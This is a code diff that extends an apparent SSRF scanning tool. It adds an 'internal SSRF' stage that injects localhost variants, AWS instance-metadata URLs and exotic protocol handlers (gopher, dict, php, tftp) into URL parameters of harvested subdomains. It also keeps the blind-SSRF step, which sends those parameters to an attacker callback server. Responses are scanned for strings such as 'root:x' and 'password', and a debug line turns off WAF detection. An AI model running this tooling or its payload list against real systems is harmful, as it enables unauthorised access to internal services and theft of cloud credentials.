@@ -228,14 +228,14 @@ def clear_data():
         print(f"{Fore.GREEN}🧹 Data cleanup completed{Style.RESET_ALL}")
 
 async def run_scan(subdomains_file: str, output_file: str = None, callback_url: str = None, tools=None):
-    """Main scanning logic"""
+    """Main scanning logic: blind SSRF + internal SSRF"""
     if not os.path.exists(subdomains_file):
         print(f"{Fore.RED}❌ Error: Subdomains file not found: {subdomains_file}{Style.RESET_ALL}")
         return
     config = Config()
     db = Database()
     processor = URLProcessor()
-    # Require callback URL
+    # Require callback URL for blind SSRF
     if not callback_url:
         print(f"{Fore.RED}❌ No callback URL specified. Please provide your public callback URL with -c http://<your-public-ip>:<port>/callback{Style.RESET_ALL}")
         return
@@ -243,58 +243,143 @@ async def run_scan(subdomains_file: str, output_file: str = None, callback_url: 
     print(f"📁 Subdomains file: {subdomains_file}")
     print(f"🔗 Callback URL: {callback_url}")
     # Step 1: Extract URLs from subdomains
-    print(f"\n{Fore.YELLOW}[1/4] 🔍 Extracting URLs from subdomains...{Style.RESET_ALL}")
+    print(f"\n{Fore.YELLOW}[1/5] 🔍 Extracting URLs from subdomains...{Style.RESET_ALL}")
     all_urls = processor.extract_urls_from_subdomains(subdomains_file, tools=tools)
     if not all_urls:
         print(f"{Fore.RED}❌ No URLs found. Check your subdomains file and extraction tools.{Style.RESET_ALL}")
         return
-    # Step 2: Filter URLs with parameters
-    print(f"\n{Fore.YELLOW}[2/4] 🔍 Filtering URLs with parameters...{Style.RESET_ALL}")
+    # Step 2: Filter URLs with parameters (URL params)
+    print(f"\n{Fore.YELLOW}[2/5] 🔍 Filtering URLs with URL parameters...{Style.RESET_ALL}")
     param_urls = processor.filter_urls_with_params(all_urls)
-    
     if not param_urls:
-        print(f"{Fore.RED}❌ No URLs with parameters found.{Style.RESET_ALL}")
+        print(f"{Fore.RED}❌ No URLs with URL parameters found.{Style.RESET_ALL}")
         return
-    
-    # Step 3: Replace parameters with callback URL
-    print(f"\n{Fore.YELLOW}[3/4] 🔄 Replacing parameters with callback URL...{Style.RESET_ALL}")
+    # Step 3: Blind SSRF - Replace params with callback URL
+    print(f"\n{Fore.YELLOW}[3/5] 🔄 Blind SSRF: Replacing parameters with callback URL...{Style.RESET_ALL}")
     modified_urls = processor.replace_params_with_callback(param_urls, callback_url)
-    
     if not modified_urls:
         print(f"{Fore.RED}❌ Failed to modify URLs. Check qsreplace installation.{Style.RESET_ALL}")
         return
-    
-    # Step 4: Test URLs
-    print(f"\n{Fore.YELLOW}[4/4] 🚀 Testing URLs for SSRF...{Style.RESET_ALL}")
+    # Step 4: Blind SSRF - Test URLs
+    print(f"\n{Fore.YELLOW}[4/5] 🚀 Testing URLs for Blind SSRF...{Style.RESET_ALL}")
     async with SSRFTester() as tester:
         results = await tester.test_urls(modified_urls)
-    
     # Save results if output file specified
     if output_file:
         with open(output_file, 'w') as f:
             json.dump(results, f, indent=2)
         print(f"💾 Results saved to: {output_file}")
-    
     # Show summary
-    print(f"\n{Fore.GREEN}✅ Scan completed!{Style.RESET_ALL}")
+    print(f"\n{Fore.GREEN}✅ Blind SSRF scan completed!{Style.RESET_ALL}")
     print(f"\n{Fore.YELLOW}📊 Summary:{Style.RESET_ALL}")
     print(f"  📄 Total URLs found: {len(all_urls)}")
-    print(f"  🔗 URLs with parameters: {len(param_urls)}")
-    print(f"  🧪 URLs tested: {len(modified_urls)}")
-    
-    # Show some example URLs that were tested
-    if modified_urls:
-        print(f"\n{Fore.YELLOW}🔍 Example tested URLs:{Style.RESET_ALL}")
-        for i, url in enumerate(modified_urls[:3]):  # Show first 3
-            print(f"  {i+1}. {url}")
-        if len(modified_urls) > 3:
-            print(f"  ... and {len(modified_urls) - 3} more")
-    
+    print(f"  🔗 URLs with URL parameters: {len(param_urls)}")
+    print(f"  🧪 URLs tested (blind SSRF): {len(modified_urls)}")
+
     print(f"\n{Fore.CYAN}🎯 Monitor your callback server for SSRF hits!{Style.RESET_ALL}")
     print(f"📊 Dashboard: http://127.0.0.1:9001")
-    if callback_url.startswith("https://"):
-        ngrok_dashboard = callback_url.replace("/callback", "")
-        print(f"🌐 Public dashboard: {ngrok_dashboard}")
+    # Step 5: Internal SSRF - Test with internal targets
+    print(f"\n{Fore.YELLOW}[5/5] 🕵️ Testing URLs for Internal SSRF (localhost, metadata, exotic handlers, etc)...{Style.RESET_ALL}")
+    ssrf_targets = [
+        # IPv4
+        "http://localhost", "http://127.0.0.1", "http://169.254.169.254", "http://0.0.0.0", "http://[::1]",
+        "http://0177.1/", "http://0x7f.1/", "http://127.000.000.1", "https://520968996",
+        # Exotic Handlers
+        "gopher://127.0.0.1", "dict://127.0.0.1", "php://filter", "jar://127.0.0.1", "tftp://127.0.0.1",
+        # IPv6
+        "http://[::1]", "http://[::]",
+        # Wildcard DNS
+        "http://10.0.0.1.xip.io", "http://www.10.0.0.1.xip.io", "http://mysite.10.0.0.1.xip.io", "http://foo.bar.10.0.0.1.xip.io",
+        # AWS Metadata
+        "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/local-hostname", "http://169.254.169.254/latest/meta-data/public-hostname"
+    ]
+    internal_results = []
+    import aiohttp
+    from difflib import SequenceMatcher
+    from urllib.parse import urlparse
+    from tqdm import tqdm
+    import asyncio
+    # Helper async function for a single internal SSRF test
+    async def test_internal_ssrf(url, params, baseline_status, baseline_body, ssrf_targets):
+        results = []
+        from urllib.parse import unquote, urlparse
+        for target in ssrf_targets:
+            new_params = []
+            for param in params:
+                key_value = param.split('=', 1)
+                if len(key_value) == 2:
+                    value = key_value[1]
+                    decoded_value = unquote(value)
+                    if decoded_value.startswith(('http://', 'https://', 'gopher://', 'dict://', 'php://', 'jar://', 'tftp://')):
+                        new_params.append(f"{key_value[0]}={target}")
+                    else:
+                        new_params.append(param)
+                else:
+                    new_params.append(param)
+            parsed = urlparse(url)
+            new_query = '&'.join(new_params)
+            new_url = url.replace(parsed.query, new_query)
+            try:
+                async with aiohttp.ClientSession() as session:
+                    async with session.get(new_url, timeout=10, allow_redirects=False) as resp:
+                        status = resp.status
+                        headers = dict(resp.headers)
+                        body = await resp.text()
+                        waf_headers = [h for h in headers if 'waf' in h.lower() or 'firewall' in h.lower()]
+                        similarity = SequenceMatcher(None, baseline_body, body).ratio()
+                        is_interesting = False
+                        if status != baseline_status:
+                            is_interesting = True
+                        if similarity < 0.95:
+                            is_interesting = True
+                        if any(keyword in body.lower() for keyword in ["localhost", "127.0.0.1", "meta-data", "x-amz", "ec2", "internal", "root:x", "password", "admin"]):
+                            is_interesting = True
 
+                        waf_headers=False # debug should be cahnged later
+
+                        if status == 200 and not waf_headers and is_interesting:
+                            print(f"{Fore.RED}❗ Possible Internal SSRF Vulnerability: {new_url}{Style.RESET_ALL}")
+                            print(f"    Status: {status} | Similarity: {similarity:.2f} | WAF: {waf_headers}")
+                        results.append({
+                            "url": new_url,
+                            "status": status,
+                            "baseline_status": baseline_status,
+                            "waf_headers": waf_headers,
+                            "body_snippet": body[:200],
+                            "similarity": similarity,
+                            "is_interesting": is_interesting
+                        })
+            except Exception:
+                pass
+        return results
+    # Prepare tasks for all param_urls
+    tasks = []
+    for url in tqdm(param_urls, desc="Testing URLs (Internal SSRF)"):
+        parsed = urlparse(url)
+        params = parsed.query.split('&')
+        # Make baseline request (no injection)
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url, timeout=10) as resp:
+                    baseline_status = resp.status
+                    baseline_headers = dict(resp.headers)
+                    baseline_body = await resp.text()
+        except Exception:
+            baseline_status = None
+            baseline_headers = {}
+            baseline_body = ""
+        tasks.append(test_internal_ssrf(url, params, baseline_status, baseline_body, ssrf_targets))
+    # Run all tasks concurrently
+    all_results = await asyncio.gather(*tasks)
+    for result in all_results:
+        internal_results.extend(result)
+    print(f"\n{Fore.GREEN}✅ Internal SSRF scan completed!{Style.RESET_ALL}")
+    print(f"Total internal SSRF tests performed: {len(internal_results)}")
+    # Optionally save internal SSRF results
+    if output_file:
+        with open(output_file.replace('.json', '_internal.json'), 'w') as f:
+            json.dump(internal_results, f, indent=2)
+        print(f"💾 Internal SSRF results saved to: {output_file.replace('.json', '_internal.json')}")
+        
 if __name__ == "__main__":
     cli()
